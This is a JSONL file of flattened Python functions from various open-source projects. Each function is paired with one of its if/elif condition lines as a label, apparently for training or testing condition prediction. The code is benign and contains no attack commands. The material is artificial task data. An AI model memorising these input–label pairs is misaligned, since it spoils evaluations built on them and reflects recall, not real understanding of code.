{"input": "def document_type(self): if isinstance(self.document_type_obj, basestring): if self.document_type_obj == RECURSIVE_REFERENCE_CONSTANT: self.document_type_obj = self.owner_document else: self.document_type_obj = get_document(self.document_type_obj) return self.document_type_obj", "label": "if self . document_type_obj == RECURSIVE_REFERENCE_CONSTANT :"}
{"input": "def _get_closest_end(end_after, begin_after): \"\"\"returns the closest \\\\end, that is open\"\"\" end_iter = iter(end_after) begin_iter = iter(begin_after) while True: try: e = next(end_iter) except: raise NoEnvError(\"No closing environment detected\") try: b = next(begin_iter) except: break if not e.begin() > b.begin(): break return e", "label": "if not e . begin ( ) > b . begin ( ) :"}
{"input": "def group_curves(self, curves): result = [[curves[0]]] tolerance = self.concat_tolerance for curve1, curve2 in zip(curves, curves[1:]): _, t_max_1 = curve1.get_u_bounds() t_min_2, _ = curve2.get_u_bounds() end1 = curve1.evaluate(t_max_1) begin2 = curve2.evaluate(t_min_2) distance = np.linalg.norm(begin2 - end1) if distance > tolerance: result.append([curve2]) else: result[-1].append(curve2) return result", "label": "if distance > tolerance :"}
{"input": "def iteraddcolumn(table, field, col, index, missing): it = iter(table) hdr = next(it) # determine position of new column if index is None: index = len(hdr) # construct output header outhdr = list(hdr) outhdr.insert(index, field) yield tuple(outhdr) # construct output data for row, val in izip_longest(it, col, fillvalue=missing): # run out of rows? if row == missing: row = [missing] * len(hdr) outrow = list(row) outrow.insert(index, val) yield tuple(outrow)", "label": "if row == missing :"}
{"input": "def validate_is_admin(self, attrs, source): project = attrs.get(\"project\", None if self.object is None else self.object.project) if project is None: return attrs if self.object and self.object.user: if self.object.user.id == project.owner_id and not attrs[source]: raise ValidationError(_(\"The project owner must be admin.\")) if not services.project_has_valid_admins( project, exclude_user=self.object.user ): raise ValidationError( _(\"At least one user must be an active admin for this project.\") ) return attrs", "label": "if self . object . user . id == project . owner_id and not attrs [ source ] :"}
{"input": "def handle_periodic(self): if self._closed: if self._server_socket: self._eventloop.remove(self._server_socket) self._server_socket.close() self._server_socket = None logging.info(\"closed TCP port %d\", self._listen_port) for handler in list(self._fd_to_handlers.values()): handler.destroy() self._sweep_timeout()", "label": "if self . _server_socket :"}
{"input": "def get_item(type_, preference): items = {} for item in playlist.findall(\"./info/%s/item\" % type_): lang, label = xpath_text(item, \"lg\", default=None), xpath_text( item, \"label\", default=None ) if lang and label: items[lang] = label.strip() for p in preference: if items.get(p): return items[p]", "label": "if items . get ( p ) :"}
{"input": "def save_all_changed_configs(self): \"\"\"Save configuration changes to the user config file.\"\"\" has_changes = False for ext_name in self.extensions: options = self.extensions[ext_name] for opt in options: if self.set_user_value(ext_name, opt): has_changes = True if has_changes: self.userCfg.Save()", "label": "if self . set_user_value ( ext_name , opt ) :"}
{"input": "def extract_validators(namespace: Dict[str, Any]) -> Dict[str, List[Validator]]: validators: Dict[str, List[Validator]] = {} for var_name, value in namespace.items(): validator_config = getattr(value, VALIDATOR_CONFIG_KEY, None) if validator_config: fields, v = validator_config for field in fields: if field in validators: validators[field].append(v) else: validators[field] = [v] return validators", "label": "if validator_config :"}
{"input": "def _bindTable(self, tableName, create=False): for attempt in retry_azure(): with attempt: try: exists = self.tableService.exists(table_name=tableName) except AzureMissingResourceHttpError as e: if e.status_code != 404: raise else: if exists: return AzureTable(self.tableService, tableName) if create: self.tableService.create_table(tableName) return AzureTable(self.tableService, tableName) else: return None", "label": "if create :"}
{"input": "def extract(self): for battery in self.vars: for line in dopen(\"/proc/acpi/battery/\" + battery + \"/state\").readlines(): l = line.split() if len(l) < 3: continue if l[0:2] == [\"remaining\", \"capacity:\"]: remaining = int(l[2]) continue elif l[0:2] == [\"present\", \"rate:\"]: rate = int(l[2]) continue if rate and remaining: self.val[battery] = remaining * 60 / rate else: self.val[battery] = -1", "label": "if l [ 0 : 2 ] == [ \"remaining\" , \"capacity:\" ] :"}
{"input": "def merge_syntactic_units(original_units, filtered_units, tags=None): units = [] for i in range(len(original_units)): if filtered_units[i] == \"\": continue text = original_units[i] token = filtered_units[i] tag = tags[i][1] if tags else None sentence = SyntacticUnit(text, token, tag) sentence.index = i units.append(sentence) return units", "label": "if filtered_units [ i ] == \"\" :"}
{"input": "def copy_grads_to_fp32(self, fp16_net, fp32_weights): \"\"\"Copy gradients from fp16 model to fp32 weight copy.\"\"\" for fp32_param, fp16_param in zip(fp32_weights, fp16_net.parameters()): if fp16_param.grad is not None: if fp32_param.grad is None: fp32_param.grad = fp32_param.data.new(fp32_param.size()) fp32_param.grad.copy_(fp16_param.grad)", "label": "if fp16_param . grad is not None :"}
{"input": "def gen_new_segments(datadir, spk_list): if not os.path.isfile(os.path.join(datadir, \"segments\")): raise ValueError(\"no segments file found in datadir\") new_segments = open(os.path.join(datadir, \"new_segments\"), \"w\", encoding=\"utf-8\") segments = open(os.path.join(datadir, \"segments\"), \"r\", encoding=\"utf-8\") while True: line = segments.readline() if not line: break spk = line.split(\"_\")[0] if spk in spk_list: new_segments.write(line) new_segments.close(), segments.close()", "label": "if spk in spk_list :"}
{"input": "def _get_sources(include_per_machine=True, include_per_user=True): if _is_64bit_os(): if include_per_user: yield open_source(REGISTRY_SOURCE_CU), None if include_per_machine: yield open_source(REGISTRY_SOURCE_LM), \"64bit\" yield open_source(REGISTRY_SOURCE_LM_WOW6432), \"32bit\" else: if include_per_user: yield open_source(REGISTRY_SOURCE_CU), \"32bit\" if include_per_machine: yield open_source(REGISTRY_SOURCE_LM), \"32bit\"", "label": "if include_per_user :"}
{"input": "def AddWindowMenu(self, pMenuBar): if pMenuBar and self._pWindowMenu: pos = pMenuBar.FindMenu(wx.GetStockLabel(wx.ID_HELP, wx.STOCK_NOFLAGS)) if pos == wx.NOT_FOUND: pMenuBar.Append(self._pWindowMenu, _(\"&Window\")) else: pMenuBar.Insert(pos, self._pWindowMenu, _(\"&Window\"))", "label": "if pos == wx . NOT_FOUND :"}
{"input": "def remove(self, res): \"\"\"Remove resource\"\"\" msg_box = QMessageBox( QMessageBox.Critical, self.app.translate(\"ResourceEdit\", \"Delete Resource\"), self.app.translate( \"ResourceEdit\", \"Are you sure want to delete this resource?\" ), QMessageBox.Yes | QMessageBox.No, ) ret = msg_box.exec_() if ret == QMessageBox.Yes: self._resources.remove(res) self._resource_labels[res].hide() del self._resource_labels[res] self.on_change() if not self._resources: self.widget.hide() self.update_label()", "label": "if not self . _resources :"}
{"input": "def reader(self, myself): ok = True line = \"\" while True: line = sys.stdin.readline().strip() if ok: if not line: ok = False continue elif not line: break else: ok = True self.Q.append(line) os.kill(myself, signal.SIGTERM)", "label": "if not line :"}
{"input": "def _compute_ratios(counts, n_total, multilabel=False): computed_ratios = {} max_count = max(counts.values()) for class_name, count in counts.items(): if multilabel: ratio = (n_total - count) / count else: ratio = ratio = max_count / count computed_ratios[class_name] = ratio return computed_ratios", "label": "if multilabel :"}
{"input": "def test_tags(context_obj, sagemaker_session): tags = [{\"Key\": \"foo1\", \"Value\": \"bar1\"}] context_obj.set_tags(tags) while True: actual_tags = sagemaker_session.sagemaker_client.list_tags( ResourceArn=context_obj.context_arn )[\"Tags\"] if actual_tags: break time.sleep(5) # When sagemaker-client-config endpoint-url is passed as argument to hit some endpoints, # length of actual tags will be greater than 1 assert len(actual_tags) > 0 assert [actual_tags[-1]] == tags", "label": "if actual_tags :"}
{"input": "def step(self, action): \"\"\"Repeat action, sum reward, and max over last observations.\"\"\" total_reward = 0.0 done = None for i in range(self._skip): obs, reward, done, info = self.env.step(action) if i == self._skip - 2: self._obs_buffer[0] = obs if i == self._skip - 1: self._obs_buffer[1] = obs total_reward += reward if done: break # Note that the observation on the done=True frame doesn't matter. max_frame = self._obs_buffer.max(axis=0) return max_frame, total_reward, done, info", "label": "if i == self . _skip - 1 :"}
{"input": "def prepare_text(text, style): body = [] for fragment, sty in parse_tags(text, style, subs.styles): fragment = fragment.replace(r\"\\h\", \" \") fragment = fragment.replace(r\"\\n\", \"\\n\") fragment = fragment.replace(r\"\\N\", \"\\n\") if sty.italic: fragment = \"<i>%s</i>\" % fragment if sty.underline: fragment = \"<u>%s</u>\" % fragment if sty.strikeout: fragment = \"<s>%s</s>\" % fragment if sty.drawing: raise ContentNotUsable body.append(fragment) return re.sub(\"\\n+\", \"\\n\", \"\".join(body).strip())", "label": "if sty . underline :"}
{"input": "def GetConvertersByClass(value_cls): \"\"\"Returns all converters that take given value as an input value.\"\"\" try: return ExportConverter.converters_cache[value_cls] except KeyError: results = [ cls for cls in ExportConverter.classes.values() if cls.input_rdf_type == value_cls ] if not results: results = [DataAgnosticExportConverter] ExportConverter.converters_cache[value_cls] = results return results", "label": "if cls . input_rdf_type == value_cls"}
{"input": "def enable(self): \"\"\"enable the patch.\"\"\" for patch in self.dependencies: patch.enable() if not self.enabled: pyv = sys.version_info[0] if pyv == 2: if self.PY2 == SKIP: return # skip patch activation if not self.PY2: raise IncompatiblePatch(\"Python 2 not supported!\") if pyv == 3: if self.PY3 == SKIP: return # skip patch activation if not self.PY3: raise IncompatiblePatch(\"Python 3 not supported!\") self.pre_enable() self.do_enable() self.enabled = True", "label": "if pyv == 2 :"}
{"input": "def _maybe_uncompress(self): if not self._decompressed: compression_type = self.compression_type if compression_type != self.CODEC_NONE: data = memoryview(self._buffer)[self._pos :] if compression_type == self.CODEC_GZIP: uncompressed = gzip_decode(data) if compression_type == self.CODEC_SNAPPY: uncompressed = snappy_decode(data.tobytes()) if compression_type == self.CODEC_LZ4: uncompressed = lz4_decode(data.tobytes()) self._buffer = bytearray(uncompressed) self._pos = 0 self._decompressed = True", "label": "if compression_type == self . CODEC_LZ4 :"}
{"input": "def transform(node, filename): root = ast.Module(None, node, lineno=1) nodes = [root] while nodes: node = nodes.pop() node.filename = filename if node.__class__ in (ast.Printnl, ast.Print): node.dest = ast.Name(\"__context\") elif node.__class__ is ast.Const and isinstance(node.value, str): try: node.value.decode(\"ascii\") except UnicodeError: node.value = node.value.decode(\"utf-8\") nodes.extend(node.getChildNodes()) return root", "label": "if node . __class__ in ( ast . Printnl , ast . Print ) :"}
{"input": "def __init__(self, json=None): if not json: self._mods = dict() return mods = collections.defaultdict(set) installed_path_patt = re.compile( \".*[\\\\\\\\/]target[\\\\\\\\/]product[\\\\\\\\/][^\\\\\\\\/]+([\\\\\\\\/].*)$\" ) for module in json.values(): for path in module[\"installed\"]: match = installed_path_patt.match(path) if match: for path in module[\"path\"]: mods[match.group(1)].add(path) self._mods = { installed_path: sorted(src_dirs) for installed_path, src_dirs in mods.items() }", "label": "if match :"}
{"input": "def _findSubpath(self, path, A, B, inside): print(\"finding\", A, B) sub = None for i in xrange(0, len(path) * 2): # iterate twice with wrap around j = i % len(path) seg = path[j] if inside.isInside(seg.midPoint()): if eq(seg.A, A): sub = Path(\"subp\") print(\"seg\", sub is None, seg) if sub is not None: sub.append(seg) if eq(seg.B, B): break print(\"found\", sub) return sub", "label": "if eq ( seg . B , B ) :"}
{"input": "def on_click(self, event): button = event[\"button\"] if button in [self.button_next, self.button_previous]: if self.station_data: self.scrolling = True if button == self.button_next: self.active_index += 1 elif button == self.button_previous: self.active_index -= 1 self.active_index %= self.count_stations else: self.py3.prevent_refresh() elif button == self.button_refresh: self.idle_time = 0 else: self.py3.prevent_refresh()", "label": "if button == self . button_next :"}
{"input": "def __init_subclass__(cls, *, abstract=False): if abstract: return fields = {} for name in cls.__dict__: attr = cls.__dict__[name] if name.startswith(\"__\") or callable(attr): continue if not isinstance(attr, CType): raise TypeError(f\"field {cls.__name__}.{name!r} must be a Type\") else: fields[name] = attr cls._fields = fields", "label": "if name . startswith ( \"__\" ) or callable ( attr ) :"}
{"input": "def add(self, geom): \"Add the geometry to this Geometry Collection.\" if isinstance(geom, OGRGeometry): if isinstance(geom, self.__class__): for g in geom: capi.add_geom(self.ptr, g.ptr) else: capi.add_geom(self.ptr, geom.ptr) elif isinstance(geom, six.string_types): tmp = OGRGeometry(geom) capi.add_geom(self.ptr, tmp.ptr) else: raise OGRException(\"Must add an OGRGeometry.\")", "label": "if isinstance ( geom , self . __class__ ) :"}
{"input": "def __str__(self): result = [] for x in self._fields_: key = x[0] value = getattr(self, key) fmt = \"%s\" if key in self._fmt_: fmt = self._fmt_[key] elif \"<default>\" in self._fmt_: fmt = self._fmt_[\"<default>\"] result.append((\"%s: \" + fmt) % (key, value)) return self.__class__.__name__ + \"(\" + string.join(result, \", \") + \")\"", "label": "elif \"<default>\" in self . _fmt_ :"}
{"input": "def add(self, *objs): for obj in objs: if not isinstance(obj, self.model): raise TypeError( \"'%s' instance expected, got %r\" % (self.model._meta.object_name, obj) ) setattr(obj, rel_field.name, self.instance) obj.save()", "label": "if not isinstance ( obj , self . model ) :"}
{"input": "def _eliminate_deprecated_list_indexing(idx): # \"Basic slicing is initiated if the selection object is a non-array, # non-tuple sequence containing slice objects, [Ellipses, or newaxis # objects]\". Detects this case and canonicalizes to a tuple. This case is # deprecated by NumPy and exists for backward compatibility. if not isinstance(idx, tuple): if isinstance(idx, Sequence) and not isinstance(idx, ndarray): if _any(_should_unpack_list_index(i) for i in idx): idx = tuple(idx) else: idx = (idx,) else: idx = (idx,) return idx", "label": "if isinstance ( idx , Sequence ) and not isinstance ( idx , ndarray ) :"}
{"input": "def __init__(self, parent=None, **kwargs): super(DefaultWidget, self).__init__(parent) self.parent = parent self.FSettings = SuperSettings.getInstance() self.defaultui = [] self.allui = [] self.__tabbyname = {} __defaultui = [ui(parent, self.FSettings) for ui in TabsWidget.__subclasses__()] for ui in __defaultui: if not ui.isSubitem: self.defaultui.append(ui) self.allui.append(ui) self.__tabbyname[ui.Name] = ui setattr(self.__class__, ui.ID, ui)", "label": "if not ui . isSubitem :"}
{"input": "def onMouseMove(self, event): x, y = event.xdata, event.ydata if x is not None: extra_text = self.getExtraText(x, y) # extra_text = \"TODO:\" if extra_text: self.message(\"x,y=%5.4e,%5.4e %s\" % (x, y, extra_text), index=0) else: self.message(\"x,y=%5.4e,%5.4e\" % (x, y), index=0) else: self.message(None)", "label": "if extra_text :"}
{"input": "def tag_configure(self, *args, **keys): if len(args) == 1: key = args[0] self.tags[key] = keys val = keys.get(\"foreground\") underline = keys.get(\"underline\") if val: self.configDict[key] = val if underline: self.configUnderlineDict[key] = True else: g.trace(\"oops\", args, keys)", "label": "if underline :"}
{"input": "def _flatten_shape(s, index): if s.is_array(): yield index, s else: assert s.is_tuple() for i, sub in enumerate(s.tuple_shapes()): subindex = index + (i,) if sub.is_tuple(): yield from _flatten_shape(sub, subindex) else: yield subindex, sub", "label": "if sub . is_tuple ( ) :"}
{"input": "def delete_if_forked(ghrequest): FORKED = False query = \"/user/repos\" r = utils.query_request(query) for repo in r.json(): if repo[\"description\"]: if ghrequest.target_repo_fullname in repo[\"description\"]: FORKED = True url = f\"/repos/{repo['full_name']}\" utils.query_request(url, method=\"DELETE\") return FORKED", "label": "if ghrequest . target_repo_fullname in repo [ \"description\" ] :"}
{"input": "def update_json(self): n_id = node_id(self) if self.autoreload: self.reload_json() if n_id not in self.json_data and self.current_text: self.reload_json() if n_id not in self.json_data: self.use_custom_color = True self.color = FAIL_COLOR return self.use_custom_color = True self.color = READY_COLOR json_data = self.json_data[n_id] for item in json_data: if item in self.outputs and self.outputs[item].is_linked: out = json_data[item][1] self.outputs[item].sv_set(out)", "label": "if item in self . outputs and self . outputs [ item ] . is_linked :"}
{"input": "def _check_num_states(self, num_states): \"\"\"Track the number of states.\"\"\" self._num_states += num_states if self._max_num_states is not None: if self._num_states > self._max_num_states: raise RuntimeError( \"Too many states detected while running dynamic \" \"programming: got %d states but upper limit is %d.\" % (self._num_states, self._max_num_states) )", "label": "if self . _num_states > self . _max_num_states :"}
{"input": "def __del__(self): try: if self._mpz_p is not None: if self._initialized: _gmp.mpz_clear(self._mpz_p) self._mpz_p = None except AttributeError: pass", "label": "if self . _mpz_p is not None :"}
{"input": "def cmp(f1, f2): bufsize = 1024 * 8 with open(f1, \"rb\") as fp1, open(f2, \"rb\") as fp2: while True: b1 = fp1.read(bufsize) b2 = fp2.read(bufsize) if b1 != b2: return False if not b1: return True", "label": "if b1 != b2 :"}
{"input": "def _get_changes(diff): \"\"\"Get a list of changed versions from git.\"\"\" changes_dict = {} for line in diff: if not line.startswith(\"-\") and not line.startswith(\"+\"): continue if line.startswith(\"+++ \") or line.startswith(\"--- \"): continue name, version = parse_versioned_line(line[1:]) if name not in changes_dict: changes_dict[name] = Change(name) if line.startswith(\"-\"): changes_dict[name].old = version elif line.startswith(\"+\"): changes_dict[name].new = version return [change for _name, change in sorted(changes_dict.items())]", "label": "if not line . startswith ( \"-\" ) and not line . startswith ( \"+\" ) :"}
{"input": "def analyze(vw): for va, dest in vw.findPointers(): # Is there a location already at the target? loc = vw.getLocation(dest) if loc is None: continue if loc[L_LTYPE] != LOC_IMPORT: continue offset, bytes = vw.getByteDef(va) if offset < 2: continue if bytes[offset - 2 : offset] == b\"\\xff\\x15\": # call [importloc] # If there's a pointer here, remove it. if vw.getLocation(va): vw.delLocation(va) vw.makeCode(va - 2)", "label": "if vw . getLocation ( va ) :"}
{"input": "def match_blanks(self, s, i): if 1: # Use Qt code to show invisibles. return 0 else: # Old code... if not self.showInvisibles: return 0 j = i n = len(s) while j < n and s[j] == \" \": j += 1 if j > i: self.colorRangeWithTag(s, i, j, \"blank\") return j - i else: return 0", "label": "if j > i :"}
{"input": "def compress(self, data_list): # Differs from the default implementation: If only a time is given and no date, we consider the field empty if data_list: if data_list[0] in self.empty_values: return None if data_list[1] in self.empty_values: raise ValidationError( self.error_messages[\"invalid_date\"], code=\"invalid_date\" ) result = datetime.datetime.combine(*data_list) return from_current_timezone(result) return None", "label": "if data_list [ 1 ] in self . empty_values :"}
{"input": "def test_iter_keys(self): for name in (\"interfaces\", \"addresses\", \"neighbours\", \"routes\", \"rules\"): view = getattr(self.ndb, name) for key in view: assert isinstance(key, Record) obj = view.get(key) if obj is not None: assert isinstance(obj, RTNL_Object)", "label": "if obj is not None :"}
{"input": "def has_selenium(): try: from selenium import selenium globals().update(selenium=selenium) sel = selenium(*sel_args) # a little trick to see if the server is responding try: sel.do_command(\"shutdown\", \"\") except Exception as e: if not \"Server Exception\" in str(e): raise result = True except ImportError: result = SeleniumFailed(\"selenium RC not installed\") except Exception: msg = \"Error occurred initializing selenium: %s\" % e result = SeleniumFailed(msg) # overwrite has_selenium, so the same result is returned every time globals().update(has_selenium=lambda: result) return result", "label": "if not \"Server Exception\" in str ( e ) :"}
{"input": "def analyze(vw): for va, dest in vw.findPointers(): # Is there a location already at the target? loc = vw.getLocation(dest) if loc is None: continue if loc[L_LTYPE] != LOC_IMPORT: continue offset, bytes = vw.getByteDef(va) if offset < 2: continue if bytes[offset - 2 : offset] == b\"\\xff\\x15\": # call [importloc] # If there's a pointer here, remove it. if vw.getLocation(va): vw.delLocation(va) vw.makeCode(va - 2)", "label": "if bytes [ offset - 2 : offset ] == b\"\\xff\\x15\" :"}
{"input": "def get(_kwargs): exception_raised_every_time = True exception = None no_match = True for meter in self.meters: try: match = getattr(meter, func)(_kwargs) except KeyError as e: exception = e else: exception_raised_every_time = False if match: selected_meters.append(meter) no_match = False if no_match: raise KeyError(\"'No match for {}'\".format(_kwargs)) if exception_raised_every_time and exception is not None: raise exception", "label": "if match :"}
{"input": "def derive(self, key_material): if self._used: raise AlreadyFinalized self._used = True if not isinstance(key_material, bytes): raise TypeError(\"key_material must be bytes.\") output = [b\"\"] outlen = 0 counter = 1 while self._length > outlen: h = hashes.Hash(self._algorithm, self._backend) h.update(key_material) h.update(_int_to_u32be(counter)) if self._sharedinfo is not None: h.update(self._sharedinfo) output.append(h.finalize()) outlen += len(output[-1]) counter += 1 return b\"\".join(output)[: self._length]", "label": "if self . _sharedinfo is not None :"}
{"input": "def test_cat(shape, cat_dim, split, dim): assert sum(split) == shape[cat_dim] gaussian = random_gaussian(shape, dim) parts = [] end = 0 for size in split: beg, end = end, end + size if cat_dim == -1: part = gaussian[..., beg:end] elif cat_dim == -2: part = gaussian[..., beg:end, :] elif cat_dim == 1: part = gaussian[:, beg:end] else: raise ValueError parts.append(part) actual = Gaussian.cat(parts, cat_dim) assert_close_gaussian(actual, gaussian)", "label": "if cat_dim == - 1 :"}
{"input": "def ghci_package_db(self, cabal): if cabal is not None and cabal != \"cabal\": package_conf = [ pkg for pkg in os.listdir(cabal) if re.match(r\"packages-(.*)\\.conf\", pkg) ] if package_conf: return os.path.join(cabal, package_conf) return None", "label": "if package_conf :"}
{"input": "def L_op(self, inputs, outputs, gout): (x,) = inputs (gz,) = gout if x.type in complex_types: raise NotImplementedError() if outputs[0].type in discrete_types: if x.type in discrete_types: return [x.zeros_like(dtype=theano.config.floatX)] else: return [x.zeros_like()] return (gz / x,)", "label": "if x . type in discrete_types :"}
{"input": "def __mro_entries__(self, bases): if self._name: # generic version of an ABC or built-in class return super().__mro_entries__(bases) if self.__origin__ is Generic: if Protocol in bases: return () i = bases.index(self) for b in bases[i + 1 :]: if isinstance(b, _BaseGenericAlias) and b is not self: return () return (self.__origin__,)", "label": "if Protocol in bases :"}
{"input": "def getvars(request, excludes): getvars = request.GET.copy() excludes = excludes.split(\",\") for p in excludes: if p in getvars: del getvars[p] if len(getvars.keys()) > 0: return \"&%s\" % getvars.urlencode() else: return \"\"", "label": "if len ( getvars . keys ( ) ) > 0 :"}
{"input": "def check(self): now = time.time() for fn in os.listdir(self.basedir): if fn in self.files: continue absfn = os.path.join(self.basedir, fn) mtime = os.stat(absfn)[stat.ST_MTIME] if now - mtime > self.old: os.remove(absfn)", "label": "if fn in self . files :"}
{"input": "def run(self): while 1: gatekeeper.wait() results = [] results.append(self.__queue.get()) while len(results) < self.MAX_SONGS_PER_SUBMISSION: # wait a bit to reduce overall request count. timeout = 0.5 / len(results) try: results.append(self.__queue.get(timeout=timeout)) except queue.Empty: break if self.__stopped: return for lookup_result in self.__process(results): self.__idle(self.__progress_cb, lookup_result) self.__queue.task_done()", "label": "if self . __stopped :"}
{"input": "def __getitem__(self, item): if isinstance(item, int): selected_polygons = [self.polygons[item]] elif isinstance(item, slice): selected_polygons = self.polygons[item] else: # advanced indexing on a single dimension selected_polygons = [] if isinstance(item, torch.Tensor) and item.dtype == torch.uint8: item = item.nonzero() item = item.squeeze(1) if item.numel() > 0 else item item = item.tolist() for i in item: selected_polygons.append(self.polygons[i]) return PolygonList(selected_polygons, size=self.size)", "label": "if isinstance ( item , torch . Tensor ) and item . dtype == torch . uint8 :"}
{"input": "def gather_files(fileset): common_type = get_common_filetype(fileset) files = [] for file in fileset.file: filename = file.name if file.is_include_file == True: filename = {} filename[file.name] = {\"is_include_file\": True} if file.file_type != common_type: if type(filename) == str: filename = {} filename[file.name] = {\"file_type\": file.file_type} files.append(filename) return files", "label": "if type ( filename ) == str :"}
{"input": "def _(node): for __ in dir(node): if not __.startswith(\"_\"): candidate = getattr(node, __) if isinstance(candidate, str): if \"\\\\\" in candidate: try: re.compile(candidate) except: errMsg = \"smoke test failed at compiling '%s'\" % candidate logger.error(errMsg) raise else: _(candidate)", "label": "if isinstance ( candidate , str ) :"}
{"input": "def _handle_children(self, removed, added): # Stop all the removed children. for obj in removed: obj.stop() # Process the new objects. for obj in added: obj.set(scene=self.scene, parent=self) if isinstance(obj, ModuleManager): obj.source = self elif is_filter(obj): obj.inputs.append(self) if self.running: try: obj.start() except: exception()", "label": "if self . running :"}
{"input": "def mean(self): \"\"\"Compute the mean of the value_field in the window.\"\"\" if len(self.data) > 0: datasum = 0 datalen = 0 for dat in self.data: if \"placeholder\" not in dat[0]: datasum += dat[1] datalen += 1 if datalen > 0: return datasum / float(datalen) return None else: return None", "label": "if datalen > 0 :"}
{"input": "def get_master_info(accounts_config, master): master_info = None for a in accounts_config[\"accounts\"]: if a[\"name\"] == master: master_info = a break if a[\"account_id\"] == master: master_info = a break if master_info is None: raise ValueError(\"Master account: %s not found in accounts config\" % (master)) return master_info", "label": "if a [ \"account_id\" ] == master :"}
{"input": "def dataset_collector(dataset_collection_description): if dataset_collection_description is DEFAULT_DATASET_COLLECTOR_DESCRIPTION: # Use 'is' and 'in' operators, so lets ensure this is # treated like a singleton. return DEFAULT_DATASET_COLLECTOR else: if dataset_collection_description.discover_via == \"pattern\": return DatasetCollector(dataset_collection_description) else: return ToolMetadataDatasetCollector(dataset_collection_description)", "label": "if dataset_collection_description . discover_via == \"pattern\" :"}
{"input": "def _eliminate_deprecated_list_indexing(idx): # \"Basic slicing is initiated if the selection object is a non-array, # non-tuple sequence containing slice objects, [Ellipses, or newaxis # objects]\". Detects this case and canonicalizes to a tuple. This case is # deprecated by NumPy and exists for backward compatibility. if not isinstance(idx, tuple): if isinstance(idx, Sequence) and not isinstance(idx, ndarray): if _any(_should_unpack_list_index(i) for i in idx): idx = tuple(idx) else: idx = (idx,) else: idx = (idx,) return idx", "label": "if _any ( _should_unpack_list_index ( i ) for i in idx ) :"}
{"input": "def finalizer(): try: stdout.flush() stderr.flush() finally: time.sleep(0.001) # HACK: Sleep 1ms in the main thread to free the GIL. stdout_pipe.stop_writing() stderr_pipe.stop_writing() writer.join(timeout=60) if writer.isAlive(): raise NailgunStreamWriterError( \"pantsd timed out while waiting for the stdout/err to finish writing to the socket.\" )", "label": "if writer . isAlive ( ) :"}
{"input": "def __init__(self, env, config, scope_infos, option_tracker): # Sorting ensures that ancestors precede descendants. scope_infos = sorted(set(list(scope_infos)), key=lambda si: si.scope) self._parser_by_scope = {} for scope_info in scope_infos: scope = scope_info.scope parent_parser = ( None if scope == GLOBAL_SCOPE else self._parser_by_scope[enclosing_scope(scope)] ) self._parser_by_scope[scope] = Parser( env, config, scope_info, parent_parser, option_tracker=option_tracker )", "label": "if scope == GLOBAL_SCOPE"}
{"input": "def _load_start_paths(self) -> None: \"Start the Read-Eval-Print Loop.\" if self._startup_paths: for path in self._startup_paths: if os.path.exists(path): with open(path, \"rb\") as f: code = compile(f.read(), path, \"exec\") exec(code, self.get_globals(), self.get_locals()) else: output = self.app.output output.write(\"WARNING | File not found: {}\\n\\n\".format(path))", "label": "if os . path . exists ( path ) :"}
{"input": "def validate(leaves): for leaf in leaves: if leaf.has_form((\"Rule\", \"RuleDelayed\"), 2): pass elif leaf.has_form(\"List\", None) or leaf.has_form(\"Association\", None): if validate(leaf.leaves) is not True: return False else: return False return True", "label": "elif leaf . has_form ( \"List\" , None ) or leaf . has_form ( \"Association\" , None ) :"}
{"input": "def add(self, name, value, package=None): # New data, not previous value if name not in self._data[package]: self._data[package][name] = value # There is data already else: # Only append at the end if we had a list if isinstance(self._data[package][name], list): if isinstance(value, list): self._data[package][name].extend(value) else: self._data[package][name].append(value)", "label": "if isinstance ( self . _data [ package ] [ name ] , list ) :"}
{"input": "def edge2str(self, nfrom, nto): if isinstance(nfrom, ExprCompose): for i in nfrom.args: if i[0] == nto: return \"[%s, %s]\" % (i[1], i[2]) elif isinstance(nfrom, ExprCond): if nfrom.cond == nto: return \"?\" elif nfrom.src1 == nto: return \"True\" elif nfrom.src2 == nto: return \"False\" return \"\"", "label": "elif nfrom . src2 == nto :"}
{"input": "def _get_config(key): config = db.session.execute( Configs.__table__.select().where(Configs.key == key) ).fetchone() if config and config.value: value = config.value if value and value.isdigit(): return int(value) elif value and isinstance(value, string_types): if value.lower() == \"true\": return True elif value.lower() == \"false\": return False else: return value # Flask-Caching is unable to roundtrip a value of None. # Return an exception so that we can still cache and avoid the db hit return KeyError", "label": "elif value and isinstance ( value , string_types ) :"}
{"input": "def from_rows(cls, rows): subtitles = [] for row in rows: if row.td.a is not None and row.td.get(\"class\", [\"lazy\"])[0] != \"empty\": subtitles.append(cls.from_row(row)) return subtitles", "label": "if row . td . a is not None and row . td . get ( \"class\" , [ \"lazy\" ] ) [ 0 ] != \"empty\" :"}
{"input": "def _wx_node(self, parent_node, index, label, with_checkbox): ct_type = 1 if with_checkbox else 0 if index is not None: # blame wxPython for this ugliness if isinstance(index, int): return self.InsertItemByIndex(parent_node, index, label, ct_type=ct_type) else: return self.InsertItem(parent_node, index, label, ct_type=ct_type) return self.AppendItem(parent_node, label, ct_type=ct_type)", "label": "if isinstance ( index , int ) :"}
{"input": "def fetch(): retval = {} content = retrieve_content(__url__) if __check__ in content: for line in content.split(\"\\n\"): line = line.strip() if not line or line.startswith(\"#\") or \".\" not in line: continue if \" # \" in line: reason = line.split(\" # \")[1].split()[0].lower() if reason == \"scanning\": # too many false positives continue retval[line.split(\" # \")[0]] = (__info__, __reference__) return retval", "label": "if \" # \" in line :"}
{"input": "def _remove_event(self, event): # Find event according to its timestamp. # Index returned should be one behind. i = bisect.bisect(self._eventq, event) # Having two events with identical timestamp is unlikely but possible. # I am going to move forward and compare timestamp AND object address # to make sure the correct object is found. while i > 0: i -= 1 e = self._eventq[i] if e.timestamp != event.timestamp: raise exception.EventNotFound(event) elif id(e) == id(event): self._eventq.pop(i) return raise exception.EventNotFound(event)", "label": "elif id ( e ) == id ( event ) :"}
{"input": "def _safe_get_content(self, session, resolve_from): try: resp = session.get(resolve_from, timeout=self._timeout) if resp.status_code == requests.codes.ok: return resp.content raise self.ResolverError(\"Error status_code={0}\".format(resp.status_code)) except requests.RequestException: raise self.ResolverError(\"Request error from {0}\".format(resolve_from))", "label": "if resp . status_code == requests . codes . ok :"}
{"input": "def splitlines(self, sep=None, replace=None): \"Return split lines from any file descriptor\" for fd in self.fd: fd.seek(0) for line in fd.readlines(): if replace and sep: yield line.replace(replace, sep).split(sep) elif replace: yield line.replace(replace, \" \").split() else: yield line.split(sep)", "label": "elif replace :"}
